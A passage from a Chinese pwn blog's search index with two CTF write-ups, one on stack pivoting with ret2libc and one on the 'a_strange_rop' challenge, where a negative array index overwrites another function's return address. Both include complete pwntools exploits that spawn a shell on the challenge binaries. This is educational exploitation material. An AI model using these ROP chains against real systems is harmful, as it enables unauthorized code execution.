0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p><p>所以第一段payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>这时一个新的栈帧在bss段中形成了</p><p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p><p>大致画一下内存布局供你分析</p><p><img src="/images/4.png" alt="内存布局"></p><p>接下来接收得到的puts真实地址并计算libc基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure><p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p><p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure><p>最后也是成功拿到shell</p><p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p><p>最后补一下完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>感谢阅读…</p><p>生活愉快!</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存布局</tag>
      
      <tag>栈迁移</tag>
      
      <tag>ret2libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>a_strange_rop</title>
    <link href="/2025/12/25/a-strange-rop/"/>
    <url>/2025/12/25/a-strange-rop/</url>
    
    <content type="html"><![CDATA[<p>题目来自2025XSWCTF决赛的pwn题: <code>a_atrange_rop</code></p><p>赛后才做出来</p><p>我也真是无敌了…</p><p>题目为64位动态链接elf文件</p><p>保护为<code>NX</code>和<code>canary</code></p><p>既然题目叫a_stranre_rop</p><p>我们先看看有没有gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./a_strange_rop | grep <span class="hljs-string">&quot;pop rdi&quot;</span><br></code></pre></td></tr></table></figure><p>找到了<code>pop rdi; ret;</code>这样的一个gadget</p><p>先观察一下题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  init(param_1);<br>  iVar1 = game();<br>  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;<br>    win();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>init为初始化函数，无实际意义，忽略</p><p>我们先来看一下win函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  system(<span class="hljs-string">&quot;ababalabalabalawuwuwuuwyyyyy&quot;</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到即使调用了win也不会真的<code>win</code>，但是它为我们提供了<code>call system</code>这样一个系统调用的函数</p><p>配合我们上面找到的gadget</p><p>似乎很容易就能写出system(“&#x2F;bin&#x2F;sh”)</p><p>来看看主逻辑game部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  undefined8 uVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_78;<br>  uint local_74;<br>  <span class="hljs-type">long</span> local_68 [<span class="hljs-number">11</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0040202b);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  <span class="hljs-keyword">for</span> (local_78 = <span class="hljs-number">0</span>; local_78 &lt; <span class="hljs-number">10</span>; local_78 = local_78 + <span class="hljs-number">1</span>) &#123;<br>    iVar1 = FUN_00401160();<br>    iVar2 = FUN_00401160();<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402041,(ulong)id,(ulong)(uint)(iVar1 % <span class="hljs-number">0x14</span>),(ulong)(uint)(iVar2 % <span class="hljs-number">0x14</span>));<br>    (&amp;answer)[(<span class="hljs-type">int</span>)id] = (<span class="hljs-type">long</span>)(iVar2 % <span class="hljs-number">0x14</span> + iVar1 % <span class="hljs-number">0x14</span>);<br>    id = id + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00402058);<br>  <span class="hljs-keyword">for</span> (; t &lt; <span class="hljs-number">0xb</span>; t = t + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402077);<br>    __isoc99_scanf(&amp;DAT_00402085,&amp;id);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)id) &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;DAT_00402088);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x1bf52</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_004020a8);<br>    __isoc99_scanf(&amp;DAT_004020b0,local_68 + (<span class="hljs-type">int</span>)id);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_004020b8);<br>  local_74 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)local_74) &#123;<br>      uVar4 = <span class="hljs-number">1</span>;<br>LAB_00401548:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span> uVar4;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((&amp;answer)[(<span class="hljs-type">int</span>)local_74] != local_68[(<span class="hljs-type">int</span>)local_74]) &#123;<br>      <span class="hljs-built_in">printf</span>(&amp;DAT_004020d8,(ulong)local_74);<br>      uVar4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00401548;<br>    &#125;<br>    local_74 = local_74 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>运行起来是这么个样子</p><p><img src="/images/1.png" alt="交互"></p><p>略微有点长，但是并不难理解，local_10为随机生成的canary值，因此不能直接溢出覆盖返回地址，否则会触发canary检测程序直接退出</p><p>题目要求回答一些小学数学题目，全部回答正确就跳转到win函数，但是我们已经看到win函数并没有实际作用，因此思路依旧是覆盖返回地址为我们构造的rop链</p><p>先来分析一下栈布局</p><p>定义了一个数组local_68[11]</p><p>可以分析得出</p><p><img src="/images/2.png" alt="栈布局大致如此"></p><p>题目设置了一个小check机制，明明有0到9十道题目，但是数组设置了0到10十一个题目编号，而输入的题目编号大于9的时候程序自动退出，并大声斥责我们<em>你想干什么!</em></p><p>我的第一个思路是设置题目编号为8，即local_68[9]所在的位置，向上填充至覆盖rip，执行rop链</p><p>但是这个canary是我永远越不过的坎…</p><p>思来想去，我突然注意到，题目编号大于9时会自动退出，<strong>但是</strong>题目却不检查负数编号!</p><p>因此我们可以将题目设置为负数通过负索引去写前面的地址!</p><p>用gdb看一看怎么个事儿</p><p>我在第一次输入后打上了断点，输入编号<code>-1</code>并输入答案<code>666</code>，local_68在rbp下0x60的位置，我们看看更下面的情况</p><p><img src="/images/3.png" alt="地址情况"></p><p>可以看到，正如我们分析的那般，<code>-1</code>索引写的<code>666</code>代表的<code>00029a</code>写在了local_68下方的地址，再认真一看，前方的<code>0x004014bc</code>不正是另一个函数的返回地址吗!</p><p>我们只需要将索引设置为-3便可以覆盖另一个函数的返回地址来执行我们的rop链</p><p>这个函数用canary将我们拦住，十分安全，可是，另一个函数却已经悄然被我们所攻克…</p><p>题目也是十分贴心，<code>/bin/sh</code>字符串都帮我们准备好了</p><p>接下来便很简单了</p><p>exp也是十分优雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>bin_sh = <span class="hljs-built_in">str</span>(<span class="hljs-number">4210808</span>)   <span class="hljs-comment"># 0x404078</span><br>call_system = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199136</span>)   <span class="hljs-comment"># 0x4012e0</span><br>pop_rdi_ret = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199153</span>)  <span class="hljs-comment"># 0x4012f1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_pair</span>(<span class="hljs-params">idx, val</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;题目编号:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>\n&quot;</span>.encode())<br>    p.recvuntil(<span class="hljs-string">&#x27;结果:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;val&#125;</span>\n&quot;</span>.encode())<br><br>send_pair(-<span class="hljs-number">2</span>, bin_sh)    <span class="hljs-comment"># 写 /bin/sh</span><br>send_pair(-<span class="hljs-number">1</span>, call_system)   <span class="hljs-comment"># 调用 system</span><br>send_pair(-<span class="hljs-number">3</span>, pop_rdi_ret)  <span class="hljs-comment"># 覆盖另一个函数的rip</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后也是成功地拿到shell</p><p>至此，终于理解题目为什么叫:<code>a_strange_rop</code>!</p><p>2026.2.11</p><p>ps:</p><p>经典<code>负索引</code></p><p>hh</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb</tag>
      
      <tag>内存布局</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
